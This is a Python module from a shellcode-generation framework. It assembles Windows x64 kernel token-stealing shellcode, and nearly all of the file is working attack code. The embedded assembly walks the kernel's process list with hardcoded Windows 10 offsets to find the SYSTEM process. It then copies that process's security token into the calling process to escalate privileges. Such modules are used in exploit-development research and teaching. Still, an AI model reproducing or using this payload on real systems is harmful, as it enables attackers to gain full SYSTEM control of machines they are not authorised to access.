import sys

from sickle.common.lib.reversing.assembler import Assembler
from sickle.common.lib.generic.modparser import argument_check

class Shellcode():

    arch = 'x64'

    platform = "windows"

    name = f"Windows ({arch}) Kernel Token Stealing Shellcode"
    
    module = f"{platform}/{arch}/kernel_token_stealer"
    
    example_run = f"{sys.argv[0]} -p {module} -f c"
    
    ring = 0
    
    author = ["Mark Dowd",
              "Barnaby Jack",
              "wetw0rk"]
    
    tested_platforms = ["Windows 10 (10.0.19045 N/A Build 19045)"]

    summary = "Token stealing shellcode for privilege escalation"

    description = ("Hijacks a security token of another process (specifically NT/AUTHORITY SYSTEM),"
                   " allowing for elevation of privileges.\n\n"

                   "WARNING: ASSUME KERNEL SHELLCODE DOES NOT HANDLE RETURN TO USERLAND!!")

    arguments = None

    def __init__(self, arg_object):

        self.arg_list = arg_object["positional arguments"]
        self.builder = Assembler(Shellcode.arch)

        return

    def generate_source(self):
        """Generates source code to be assembled by the keystone engine
        """

        shellcode = """
        _start:
            mov rax, qword ptr gs:[0x188] ; Obtain the current thread ( nt!_KPCR.PcrbData.CurrentThread )
            mov rax, [rax + 0xb8]         ; Obtain the current process ( nt!_KTHREAD.ApcState.Process )
            mov rcx, rax                  ; Copy the current process _KPROCESS into rcx
            mov dl, 0x04                  ; SYSTEM PROCESS PID (PID to be searched for)
        traverseLinkedList:
            mov rax, [rax + 0x448]        ; Get the pointer to first entry ( nt!_EPROCESS.ActiveProcessLinks.Flink )
            sub rax, 0x448                ; Get the base address of the entry (_EPROCESS)
            cmp [rax + 0x440], dl         ; Check if we found the SYSTEM process ( nt!_EPROCESS.UniqueProcessId )
            jne traverseLinkedList        ; If not found continue the search...
        replaceToken:
            mov rdx, [rax + 0x4b8]        ; Get SYSTEM process ( nt!_EPROCESS.Token )
            mov [rcx + 0x4b8], rdx        ; Replace target process token ( nt!_EPROCESS.Token )
        """

        return shellcode

    def get_shellcode(self):
        """Generates Kernel Token Stealing Stub
        """

        return self.builder.get_bytes_from_asm(self.generate_source())
